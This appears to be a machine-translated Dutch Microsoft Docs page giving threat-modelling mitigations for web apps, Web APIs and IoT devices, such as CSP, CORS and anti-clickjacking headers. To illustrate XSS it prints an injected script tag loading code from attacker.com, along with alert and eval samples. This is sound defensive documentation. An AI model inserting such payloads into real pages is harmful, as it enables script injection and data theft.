---
title: Configuration Management - hulpmiddel voor het modelleren van Microsoft Threat - Azure | Microsoft Docs
description: oplossingen voor bedreigingen die worden weergegeven in het hulpprogramma Threat Modeling
services: security
documentationcenter: na
author: RodSan
manager: RodSan
editor: RodSan
ms.assetid: na
ms.service: security
ms.workload: na
ms.tgt_pltfrm: na
ms.devlang: na
ms.topic: article
ms.date: 08/17/2017
ms.author: rodsan
ms.openlocfilehash: 1f3de9ba6615a9b2232cca237a822b308d89426d
ms.sourcegitcommit: 9890483687a2b28860ec179f5fd0a292cdf11d22
ms.translationtype: MT
ms.contentlocale: nl-NL
ms.lasthandoff: 01/24/2018
---
# <a name="security-frame-configuration-management--mitigations"></a>Beveiliging Frame: Configuratiebeheer | Oplossingen 
| Product/Service | Artikel |
| --------------- | ------- |
| **Webtoepassing** | <ul><li>[Implementeren van inhoud Security-beleid (CSP) en inline javascript uitschakelen](#csp-js)</li><li>[Inschakelen van de browser XSS-filter](#xss-filter)</li><li>[ASP.NET-toepassingen moeten tracering en foutopsporing voorafgaand aan de implementatie uitschakelen](#trace-deploy)</li><li>[Toegang van derden JavaScript van alleen vertrouwde bronnen](#js-trusted)</li><li>[Zorg ervoor dat de geverifieerde ASP.NET-pagina's UI Redressing of klik-steunpunten voor beveiliging opneemt](#ui-defenses)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-webtoepassingen](#cors-aspnet)</li><li>[ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen](#validate-aspnet)</li><li>[Meest recente versies van JavaScript-bibliotheken lokaal gehost gebruiken](#local-js)</li><li>[Automatische MIME-controle uitschakelen](#mime-sniff)</li><li>[Standard van SQL server-headers op Windows Azure-websites om te voorkomen dat fingerprinting verwijderen](#standard-finger)</li></ul> |
| **Database** | <ul><li>[Een Windows Firewall configureren voor toegang tot de Database-Engine](#firewall-db)</li></ul> |
| **Web-API** | <ul><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als op ASP.NET Web API CORS is ingeschakeld](#cors-api)</li><li>[Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen](#config-sensitive)</li></ul> |
| **IoT-apparaat** | <ul><li>[Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties](#admin-strong)</li><li>[Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten](#unknown-exe)</li><li>[Besturingssysteem en de extra partities van IoT-apparaat met BitLocker coderen](#partition-iot)</li><li>[Zorg ervoor dat alleen de minimale services en-functies zijn ingeschakeld op apparaten](#min-enable)</li></ul> |
| **IoT Field Gateway** | <ul><li>[Besturingssysteem en de extra partities van IoT-Veldgateway met BitLocker coderen](#field-bit-locker)</li><li>[Zorg dat de standaard-aanmeldingsreferenties van de veldgateway zijn gewijzigd tijdens de installatie](#default-change)</li></ul> |
| **IoT Cloud Gateway** | <ul><li>[Zorg ervoor dat de Gateway Cloud een proces implementeert voor de firmware verbonden apparaten up-to-date te houden](#cloud-firmware)</li></ul> |
| **Een grens machine vertrouwensrelatie** | <ul><li>[Zorg ervoor dat apparaten beveiligingsmechanismen eindpunt geconfigureerd volgens het organisatiebeleid](#controls-policies)</li></ul> |
| **Azure Storage** | <ul><li>[Zorg ervoor dat veilig beheer van Azure opslagtoegangssleutels](#secure-keys)</li><li>[Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de Azure-opslag](#cors-storage)</li></ul> |
| **WCF** | <ul><li>[Functie beperking van WCF-service inschakelen](#throttling)</li><li>[WCF-openbaarmaking via metagegevens](#info-metadata)</li></ul> | 

## <a id="csp-js"></a>Implementeren van inhoud Security-beleid (CSP) en inline javascript uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Een inleiding tot inhoud beveiligingsbeleid](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [inhoud Security Policy Reference](http://content-security-policy.com/), [beveiligingsfuncties](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Inleiding tot inhoud beveiligingsbeleid](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Kan ik de CSP gebruiken?](http://caniuse.com/#feat=contentsecuritypolicy) |
| **Stappen** | <p>Inhoud Security-beleid (CSP) is een defense-in-depth beveiligingsmechanisme, een W3C standard, waarmee de toepassingseigenaars web controle op de inhoud die is ingesloten in hun site. CSP wordt toegevoegd als een HTTP-antwoordheader op de webserver en aan de clientzijde wordt afgedwongen door browsers. Er is een beleid op basis van een lijst met geaccepteerde - een website kunt een set van vertrouwde domeinen uit welke actieve inhoud declareren, zoals JavaScript, kan worden geladen.</p><p>CSP biedt de voordelen van de volgende beveiliging:</p><ul><li>**Bescherming tegen XSS:** als een pagina kwetsbaar voor XSS is, kunt u deze in een aanvaller kan misbruiken op 2 manieren:<ul><li>Injecteren `<script>malicious code</script>`. Hiervoor werken niet als gevolg van de CSP Base beperking-1</li><li>Injecteren `<script src=”http://attacker.com/maliciousCode.js”/>`. Hiervoor werkt niet omdat de aanvaller beheerd domein niet voorkomt in goedgekeurde lijst van de CSP-domeinen</li></ul></li><li>**Controle over de gegevens exfiltration:** als schadelijke inhoud op een webpagina probeert verbinding maken met een externe website en gegevens worden gestolen, de verbinding wordt verbroken door de CSP. Dit is omdat het doeldomein niet voorkomt in goedgekeurde lijst van de CSP</li><li>**Beveiliging tegen steunpunten voor van Klik:** steunpunten voor van klikt u op een aanval techniek die een adversary kunt kader een legitieme website en forceren gebruikers klikken op de UI-elementen met is. Beveiliging tegen steunpunten voor van Klik wordt momenteel bereikt door een antwoord-header X-Frame-opties configureren. Niet alle browsers respecteren deze header en een standaardmanier als bescherming tegen steunpunten voor van Klik forward CSP gaan worden</li><li>**Realtime-aanval reporting:** als er een ingebracht bij een aanval op een website CSP is ingeschakeld, wordt automatisch een melding naar een eindpunt dat is geconfigureerd op de webserver is geactiveerd voor browsers. Op deze manier CSP fungeert als een realtime waarschuwingssysteem.</li></ul> |

### <a name="example"></a>Voorbeeld
Van voorbeeldbeleid: 
```csharp
Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
```
Dit beleid kunt scripts laden alleen vanaf de server en de google analytics server van de webtoepassing. Scripts die worden geladen vanuit een andere site wordt geweigerd. Wanneer de CSP is ingeschakeld op een website, worden automatisch de volgende functies uitgeschakeld om te beperken XSS-aanvallen. 

### <a name="example"></a>Voorbeeld
Inline-scripts worden niet uitgevoerd. Hieronder vindt u voorbeelden van inline-scripts 
```javascript
<script> some Javascript code </script>
Event handling attributes of HTML tags (e.g., <button onclick=”function(){}”>
javascript:alert(1);
```

### <a name="example"></a>Voorbeeld
Tekenreeksen wordt niet geëvalueerd als code. 
```javascript
Example: var str="alert(1)"; eval(str);
```

## <a id="xss-filter"></a>Inschakelen van de browser XSS-filter

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Beveiliging-XSS-Filter](https://www.owasp.org/index.php/List_of_useful_HTTP_headers#X-XSS-Protection) |
| **Stappen** | <p>Configuratie van de header X-XSS-beveiliging antwoorden bepaalt de browser cross-site script filter. Deze antwoordheader kan het volgende waarden hebben:</p><ul><li>`0:`Hiermee wordt het filter uitgeschakeld</li><li>`1: Filter enabled`Als een cross-site scripting-aanval wordt gedetecteerd, om te stoppen van de aanval wordt de browser opschonen van de pagina</li><li>`1: mode=block : Filter enabled`. In plaats daarvan dan opschonen van de pagina wanneer een XSS-aanval wordt gedetecteerd, de browser wordt voorkomen dat weergave van de pagina</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. De browser wordt opschonen van de pagina en rapporteren van de schending.</li></ul><p>Dit is een chroom-functie met behulp van rapporten van de CSP schending details te verzenden naar een URI van uw keuze. De laatste 2 opties worden beschouwd als veilige waarden.</p>|

## <a id="trace-deploy"></a>ASP.NET-toepassingen moeten tracering en foutopsporing voorafgaand aan de implementatie uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [ASP.NET-foutopsporing overzicht](http://msdn2.microsoft.com/library/ms227556.aspx), [ASP.NET tracering overzicht](http://msdn2.microsoft.com/library/bb386420.aspx), [hoe: tracering inschakelen voor een ASP.NET-toepassing](http://msdn2.microsoft.com/library/0x5wc973.aspx), [hoe: foutopsporing voor ASP.NET-toepassingen inschakelen](http://msdn2.microsoft.com/library/e8z01xdh(VS.80).aspx) |
| **Stappen** | Wanneer tracering is ingeschakeld voor de pagina, elke browser vraagt dat de traceergegevens die gegevens over de werkstroom en de status van de interne server bevat ook wordt verkregen. Deze informatie wordt mogelijk invloed op de beveiliging. Wanneer foutopsporing is ingeschakeld voor de pagina, worden fouten plaatsvinden op de server leiden tot een volledige stack trace-gegevens die naar de browser worden gepresenteerd. Deze gegevens kan een beveiligingsrisico voor vertrouwelijke informatie over de werkstroom van de server. |

## <a id="js-trusted"></a>Toegang van derden JavaScript van alleen vertrouwde bronnen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | JavaScript van derden moet alleen van betrouwbare bronnen worden verwezen. De referentie-eindpunten moet altijd over SSL. |

## <a id="ui-defenses"></a>Zorg ervoor dat de geverifieerde ASP.NET-pagina's UI Redressing of klik-steunpunten voor beveiliging opneemt

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Klik-steunpunten voor verdediging cheats blad OWASP](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [interne werking van IE - bestrijding steunpunten voor van Klik met de X-Frame-opties](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
| **Stappen** | <p>steunpunten klikken voor, ook wel bekend als een 'UI rechtsmiddelen aanval', is als een aanvaller met meerdere lagen voor transparant of ondoorzichtig ertoe verleiden om een gebruiker op te klikken op een knop of een koppeling op een andere pagina wanneer ze zijn wilde maken klikt u op de pagina op het hoogste niveau.</p><p>Deze gelaagdheid wordt bereikt door een schadelijke pagina met een iframe die wordt geladen pagina van het slachtoffer. Dus is de aanvaller 'kaapt' klikken zijn alleen bedoeld voor de pagina en kunnen ze naar een andere pagina, waarschijnlijk het eigendom is van een andere toepassing, domein, of beide. Om te voorkomen steunpunten klik is voor aanvallen, stelt u de juiste X-Frame-opties voor HTTP-antwoordheaders die de browser om geen framing uit andere domeinen instrueren</p>|

### <a name="example"></a>Voorbeeld
De header X-FRAME-opties kan worden ingesteld via IIS web.config. Codefragment web.config voor sites die nooit moeten worden opgesteld: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="DENY"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

### <a name="example"></a>Voorbeeld
Web.config code voor sites die alleen moeten worden opgesteld door pagina's in hetzelfde domein: 
```csharp
    <system.webServer>
        <httpProtocol>
            <customHeader>
                <add name="X-FRAME-OPTIONS" value="SAMEORIGIN"/>
            </customHeaders>
        </httpProtocol>
    </system.webServer>
```

## <a id="cors-aspnet"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als CORS is ingeschakeld op de ASP.NET-webtoepassingen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | <p>Browserbeveiliging wordt voorkomen dat een webpagina aanbrengen AJAX-aanvragen naar een ander domein. Deze beperking wordt het beleid voor dezelfde oorsprong genoemd en voorkomt dat een kwaadwillende site gevoelige gegevens leest uit een andere site. Echter, soms deze mogelijk vereist te kunnen API's veilig stellen welke andere sites kunnen gebruiken. Cross Origin Resource delen (CORS) is een W3C-standaard waarmee een server aan het beleid voor dezelfde oorsprong versoepelen. Met behulp van CORS, kunt een server expliciet kunnen sommige cross-origin-aanvragen terwijl anderen weigeren.</p><p>CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP. De kern vertaalt inschakelen van CORS met het toevoegen van een paar HTTP-antwoordheaders (Access - Control-*) op het web toepassing en dit kunnen worden uitgevoerd in een aantal manieren.</p>|

### <a name="example"></a>Voorbeeld
Toegang tot Web.config beschikbaar is, kunnen CORS worden toegevoegd via de volgende code: 
```XML
<system.webServer>
    <httpProtocol>
      <customHeaders>
        <clear />
        <add name="Access-Control-Allow-Origin" value="http://example.com" />
      </customHeaders>
    </httpProtocol>
```

### <a name="example"></a>Voorbeeld
Toegang tot web.config niet beschikbaar is, kunnen CORS worden geconfigureerd door de volgende CSharp-code toe te voegen: 
```csharp
HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "http://example.com")
```

Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in 'Access Control-toestaan-oorsprong'-kenmerk is ingesteld op een set eindig en vertrouwde oorsprongen. Dit verkeerd geconfigureerd (bijvoorbeeld als u de waarde als ' *') kan schadelijke websites voor het activeren van cross-origin-aanvragen naar de webtoepassing > zonder beperkingen, waardoor de toepassing kwetsbaar voor aanvallen CSRF. 

## <a id="validate-aspnet"></a>ValidateRequest kenmerk voor ASP.NET-pagina's inschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Webformulieren, MVC5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Validatie - Script aanvallen aanvragen](http://www.asp.net/whitepapers/request-validation) |
| **Stappen** | <p>Aanvraagvalidatie, een functie van ASP.NET sinds versie 1.1, voorkomt u dat de server accepteert niet-gecodeerde HTML van inhoud met. Deze functie is ontworpen om te voorkomen dat een aantal script-injectieaanvallen waarbij scriptcode client of HTML worden onbewust verzonden naar een server, opgeslagen en vervolgens gepresenteerd aan andere gebruikers. Nog steeds wordt aangeraden dat u alle invoergegevens valideren en HTML coderen deze indien nodig.</p><p>Aanvraagvalidatie is uitgevoerd door alle ingevoerde gegevens naar een lijst met mogelijk schadelijke waarden te vergelijken. Als er een overeenkomst optreedt, wordt ASP.NET gegeven een `HttpRequestValidationException`. Aanvragen validatiefunctie is standaard ingeschakeld.</p>|

### <a name="example"></a>Voorbeeld
Deze functie kan echter worden uitgeschakeld op het paginaniveau van de: 
```XML
<%@ Page validateRequest="false" %> 
```
of op toepassingsniveau 
```XML
<configuration>
   <system.web>
      <pages validateRequest="false" />
   </system.web>
</configuration>
```
Houd er rekening mee dat aanvragen validatiefunctie wordt niet ondersteund en maakt geen deel uit van MVC6 pijplijn. 

## <a id="local-js"></a>Meest recente versies van JavaScript-bibliotheken lokaal gehost gebruiken

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | <p>Ontwikkelaars JavaScript standaardbibliotheken zoals JQuery moet gebruiken met goedgekeurde versies van algemene JavaScript-bibliotheken die geen bekende beveiligingsfouten bevatten. Het wordt aangeraden de meest recente versie van de bibliotheken gebruikt, omdat ze oplossingen voor bekende beveiligingslekken in hun oudere versies bevatten.</p><p>Als de meest recente release kan niet worden gebruikt vanwege compatibiliteitsredenen de lager dan de minimaal vereiste versies moet worden gebruikt.</p><p>Acceptabele minimaal vereiste versies:</p><ul><li>**JQuery**<ul><li>JQuery 1.7.1</li><li>JQueryUI 1.10.0</li><li>JQuery 1,9 valideren</li><li>JQuery Mobile 1.0.1</li><li>JQuery cyclus 2.99</li><li>JQuery DataTables 1.9.0</li></ul></li><li>**Ajax Control Toolkit**<ul><li>Ajax Control Toolkit 40412</li></ul></li><li>**ASP.NET-webformulieren en Ajax**<ul><li>ASP.NET-webformulieren en Ajax 4</li><li>ASP.NET Ajax 3.5</li></ul></li><li>**ASP.NET MVC**<ul><li>ASP.NET MVC 3.0</li></ul></li></ul><p>Nooit een JavaScript-bibliotheek niet laden van externe sites zoals openbare CDN</p>|

## <a id="mime-sniff"></a>Automatische MIME-controle uitschakelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [IE8 beveiliging deel V: uitgebreide beveiliging](http://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx), [MIME-type](http://en.wikipedia.org/wiki/Mime_type) |
| **Stappen** | De header X-inhoud-Type-opties is een HTTP-header waarmee ontwikkelaars om op te geven dat de inhoud ervan niet MIME-sniff worden moet. Deze header is ontworpen om te bekijken van MIME-aanvallen te verminderen. Voor elke pagina die gebruiker instelbare inhoud kan bevatten, moet u de HTTP-Header X-inhoud-Type-opties: nosniff. Om de vereiste koptekst globaal voor alle pagina's in de toepassing, kunt u een van de volgende handelingen|

### <a name="example"></a>Voorbeeld
De koptekst toevoegen in het web.config-bestand als de toepassing wordt gehost door Internet Information Services (IIS) 7 of hoger. 
```XML
<system.webServer>
<httpProtocol>
<customHeaders>
<add name="X-Content-Type-Options" value="nosniff"/>
</customHeaders>
</httpProtocol>
</system.webServer>
```

### <a name="example"></a>Voorbeeld
De koptekst tot en met de globale toepassing toevoegen\_BeginRequest 
```csharp
void Application_BeginRequest(object sender, EventArgs e)
{
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
}
```

### <a name="example"></a>Voorbeeld
Aangepaste HTTP-module implementeren 
```csharp
public class XContentTypeOptionsModule : IHttpModule
{
#region IHttpModule Members
public void Dispose()
{
}
public void Init(HttpApplication context)
{
context.PreSendRequestHeaders += newEventHandler(context_PreSendRequestHeaders);
}
#endregion
void context_PreSendRequestHeaders(object sender, EventArgs e)
{
HttpApplication application = sender as HttpApplication;
if (application == null)
  return;
if (application.Response.Headers["X-Content-Type-Options "] != null)
  return;
application.Response.Headers.Add("X-Content-Type-Options ", "nosniff");
}
}
```

### <a name="example"></a>Voorbeeld
U kunt de vereiste koptekst alleen voor specifieke's toevoegen aan afzonderlijke antwoorden inschakelen: 

```csharp
this.Response.Headers["X-Content-Type-Options"] = "nosniff";
```

## <a id="standard-finger"></a>Standard van SQL server-headers op Windows Azure-websites om te voorkomen dat fingerprinting verwijderen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Webtoepassing | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | EnvironmentType - Azure |
| **Verwijzingen**              | [Standard van SQL server-koppen op Windows Azure-websites worden verwijderd](https://azure.microsoft.com/blog/removing-standard-server-headers-on-windows-azure-web-sites/) |
| **Stappen** | Headers zoals Server, X-ingeschakeld-door X-AspNet-Version onthullen informatie over de server en de onderliggende technologie. Het verdient aanbeveling om te onderdrukken deze koppen waardoor zo wordt voorkomen dat de toepassing fingerprinting |

## <a id="firewall-db"></a>Een Windows Firewall configureren voor toegang tot de Database-Engine

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Database | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | SQL Azure, OnPrem |
| **Kenmerken**              | N.V.T., SQL-versie - V12 |
| **Verwijzingen**              | [Het configureren van een Azure SQL database-firewall](https://azure.microsoft.com/documentation/articles/sql-database-firewall-configure/), [Windows Firewall configureren voor toegang tot de Database-Engine](https://msdn.microsoft.com/library/ms175043) |
| **Stappen** | Firewall-systemen voorkomen dat onbevoegde toegang tot bronnen van computer. Voor toegang tot een exemplaar van SQL Server Database Engine via een firewall, moet u de firewall configureren op de computer met SQL Server om toegang te verlenen |

## <a id="cors-api"></a>Zorg ervoor dat alleen vertrouwde oorsprongen zijn toegestaan als op ASP.NET Web API CORS is ingeschakeld

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 5 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Inschakelen van Cross-Origin-aanvragen in ASP.NET Web API 2](http://www.asp.net/web-api/overview/security/enabling-cross-origin-requests-in-web-api), [ASP.NET Web API - CORS-ondersteuning in ASP.NET Web API 2](https://msdn.microsoft.com/magazine/dn532203.aspx) |
| **Stappen** | <p>Browserbeveiliging wordt voorkomen dat een webpagina aanbrengen AJAX-aanvragen naar een ander domein. Deze beperking wordt het beleid voor dezelfde oorsprong genoemd en voorkomt dat een kwaadwillende site gevoelige gegevens leest uit een andere site. Echter, soms deze mogelijk vereist te kunnen API's veilig stellen welke andere sites kunnen gebruiken. Cross Origin Resource delen (CORS) is een W3C-standaard waarmee een server aan het beleid voor dezelfde oorsprong versoepelen.</p><p>Met behulp van CORS, kunt een server expliciet kunnen sommige cross-origin-aanvragen terwijl anderen weigeren. CORS is veiliger en flexibeler dan eerdere technieken zoals JSONP.</p>|

### <a name="example"></a>Voorbeeld
In de App_Start/WebApiConfig.cs voegt u de volgende code toe aan de methode WebApiConfig.Register 
```csharp
using System.Web.Http;
namespace WebService
{
    public static class WebApiConfig
    {
        public static void Register(HttpConfiguration config)
        {
            // New code
            config.EnableCors();

            config.Routes.MapHttpRoute(
                name: "DefaultApi",
                routeTemplate: "api/{controller}/{id}",
                defaults: new { id = RouteParameter.Optional }
            );
        }
    }
}
```

### <a name="example"></a>Voorbeeld
EnableCors kenmerk kan worden toegepast op actiemethoden in een domeincontroller als volgt: 

```csharp
public class ResourcesController : ApiController
{
  [EnableCors("http://localhost:55912", // Origin
              null,                     // Request headers
              "GET",                    // HTTP methods
              "bar",                    // Response headers
              SupportsCredentials=true  // Allow credentials
  )]
  public HttpResponseMessage Get(int id)
  {
    var resp = Request.CreateResponse(HttpStatusCode.NoContent);
    resp.Headers.Add("bar", "a bar value");
    return resp;
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "PUT",                          // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  [EnableCors("http://localhost:55912",       // Origin
              "Accept, Origin, Content-Type", // Request headers
              "POST",                         // HTTP methods
              PreflightMaxAge=600             // Preflight cache duration
  )]
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
}
```

Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in EnableCors kenmerk is ingesteld op een set eindig en vertrouwde oorsprongen. Dit verkeerd geconfigureerd (bijvoorbeeld als u de waarde als ' *') kan schadelijke websites voor het activeren van cross-origin-aanvragen naar de API zonder beperkingen, > waardoor de API kwetsbaar voor aanvallen CSRF. EnableCors kunt gedecoreerd worden op het niveau van de domeincontroller. 

### <a name="example"></a>Voorbeeld
Als wilt uitschakelen CORS voor een bepaalde methode in een klasse, kan het kenmerk DisableCors kan worden gebruikt zoals hieronder wordt weergegeven: 
```csharp
[EnableCors("http://example.com", "Accept, Origin, Content-Type", "POST")]
public class ResourcesController : ApiController
{
  public HttpResponseMessage Put(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  public HttpResponseMessage Post(Resource data)
  {
    return Request.CreateResponse(HttpStatusCode.OK, data);
  }
  // CORS not allowed because of the [DisableCors] attribute
  [DisableCors]
  public HttpResponseMessage Delete(int id)
  {
    return Request.CreateResponse(HttpStatusCode.NoContent);
  }
}
```

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | MVC 6 |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Cross-Origin-aanvragen (CORS) in ASP.NET Core 1.0 inschakelen](https://docs.asp.net/en/latest/security/cors.html) |
| **Stappen** | <p>In ASP.NET Core 1.0 kan CORS worden ingeschakeld met behulp van middleware of met behulp van MVC. Wanneer u MVC CORS inschakelen dezelfde CORS-services worden gebruikt, maar de CORS-middleware is niet.</p>|

**Methode 1** inschakelen van CORS met middleware: om in te schakelen CORS voor de gehele toepassing de CORS-middleware toevoegen aan de aanvraag-pijplijn met de extensie UseCors methode. Een cross-origin-beleid kan worden opgegeven wanneer de CORS-middleware met behulp van de klasse CorsPolicyBuilder toe te voegen. Er zijn twee manieren om dit te doen:

### <a name="example"></a>Voorbeeld
De eerste is om aan te roepen UseCors met een lambda. De lambda wordt een CorsPolicyBuilder-object: 
```csharp
public void Configure(IApplicationBuilder app)
{
    app.UseCors(builder =>
        builder.WithOrigins("http://example.com")
        .WithMethods("GET", "POST", "HEAD")
        .WithHeaders("accept", "content-type", "origin", "x-custom-header"));
}
```

### <a name="example"></a>Voorbeeld
De tweede is voor het definiëren van een of meer benoemde CORS-beleid en selecteer vervolgens het beleid met de naam tijdens runtime. 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddCors(options =>
    {
        options.AddPolicy("AllowSpecificOrigin",
            builder => builder.WithOrigins("http://example.com"));
    });
}
public void Configure(IApplicationBuilder app)
{
    app.UseCors("AllowSpecificOrigin");
    app.Run(async (context) =>
    {
        await context.Response.WriteAsync("Hello World!");
    });
}
```

**Methode 2** CORS inschakelen in MVC: ontwikkelaars kunnen ook MVC gebruiken om toe te passen van specifieke CORS per actie, per controller, maar ook voor alle domeincontrollers.

### <a name="example"></a>Voorbeeld
Per actie: om op te geven van een CORS-beleid voor een specifieke actie het kenmerk [EnableCors] toevoegen aan de actie. Geef de naam van het beleid. 
```csharp
public class HomeController : Controller
{
    [EnableCors("AllowSpecificOrigin")] 
    public IActionResult Index()
    {
        return View();
    }
```

### <a name="example"></a>Voorbeeld
Per domeincontroller: 
```csharp
[EnableCors("AllowSpecificOrigin")]
public class HomeController : Controller
{
```

### <a name="example"></a>Voorbeeld
Globaal: 
```csharp
public void ConfigureServices(IServiceCollection services)
{
    services.AddMvc();
    services.Configure<MvcOptions>(options =>
    {
        options.Filters.Add(new CorsAuthorizationFilterFactory("AllowSpecificOrigin"));
    });
}
```
Houd er rekening mee dat het is essentieel om ervoor te zorgen dat de lijst met oorsprongen in EnableCors kenmerk is ingesteld op een set eindig en vertrouwde oorsprongen. Dit verkeerd geconfigureerd (bijvoorbeeld als u de waarde als ' *') kan schadelijke websites voor het activeren van cross-origin-aanvragen naar de API zonder beperkingen, > waardoor de API kwetsbaar voor aanvallen CSRF. 

### <a name="example"></a>Voorbeeld
Gebruik het kenmerk [DisableCors] Schakel CORS voor een domeincontroller of actie. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a id="config-sensitive"></a>Secties van Web-API-configuratiebestanden met gevoelige gegevens versleutelen

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | Web-API | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | [Procedure: Coderen configuratiesecties in ASP.NET 2.0 met behulp van DPAPI](https://msdn.microsoft.com/library/ff647398.aspx), [geven een Configuratieprovider beveiligd](https://msdn.microsoft.com/library/68ze1hb2.aspx), [met behulp van Azure Key Vault toepassing geheimen beveiligen](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Stappen** | Configuratiebestanden, bijvoorbeeld als het bestand Web.config, appsettings.json vaak worden gebruikt voor het opslaan van gevoelige gegevens, zoals gebruikersnamen, wachtwoorden, databaseverbindingsreeksen en versleutelingssleutels. Als u deze informatie niet beveiligt, is uw toepassing gevoelig zijn voor aanvallers of kwaadwillende gebruikers het verkrijgen van gevoelige informatie zoals gebruikersnamen en wachtwoorden, databasenamen en servernamen. Op basis van het implementatietype (azure/on-premises), de gevoelige secties van configuratiebestanden met DPAPI of services zoals Azure Key Vault versleutelen. |

## <a id="admin-strong"></a>Zorg ervoor dat alle admin-interfaces zijn beveiligd met sterke referenties

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Implementatie |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
| **Verwijzingen**              | N/A  |
| **Stappen** | Administratieve interfaces dat toegang biedt tot de gateway-apparaat of het veld moeten worden beveiligd met sterke referenties. Ook andere blootgestelde interfaces, zoals Wi-Fi, SSH, bestandsshares, FTP moet zijn beveiligd met sterke referenties. De standaardwaarde is zwakke wachtwoorden niet mogen worden gebruikt. |

## <a id="unknown-exe"></a>Zorg ervoor dat onbekende code kan niet worden uitgevoerd op apparaten

| Titel                   | Details      |
| ----------------------- | ------------ |
| **Onderdeel**               | IoT-apparaat | 
| **SDL-fase**               | Ontwikkelen |  
| **Van toepassing technologieën** | Algemene |
| **Kenmerken**              | N/A  |
